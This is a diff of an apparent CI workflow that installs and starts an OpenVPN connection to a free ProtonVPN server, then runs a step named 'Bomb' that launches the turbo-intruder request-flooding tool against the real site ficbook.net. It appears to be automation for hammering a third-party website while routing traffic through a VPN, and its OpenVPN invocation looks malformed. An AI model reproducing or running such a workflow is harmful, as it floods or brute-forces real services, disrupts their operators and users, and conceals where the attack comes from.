@@ -27,9 +27,13 @@ jobs:
         #sudo apt-get install ./pack.deb
         #sudo apt-get update
         #sudo apt-get install protonvpn
-        sudo apt install -y openvpn dialog python3-pip python3-setuptools
-        sudo pip3 install protonvpn-cli
-        protonvpn-cli login ${{ secrets.VL }}
+        sudo apt-get install openvpn
+        sudo apt-get install network-manager-openvpn-gnome
+        sudo apt install resolvconf
+        sudo wget "https://raw.githubusercontent.com/ProtonVPN/scripts/master/update-resolv-conf.sh" -O "/etc/openvpn/update-resolv-conf"
+        sudo chmod +x "/etc/openvpn/update-resolv-conf"
+        sudo openvpn jp-free-08.protonvpn.net 
+        ${{ secrets.VL }}
         ${{ secrets.VP }}
     - name: Bomb
       run: java -jar turbo-intruder-all.jar beta/script_l.py beta/req.txt https://ficbook.net:433 foo
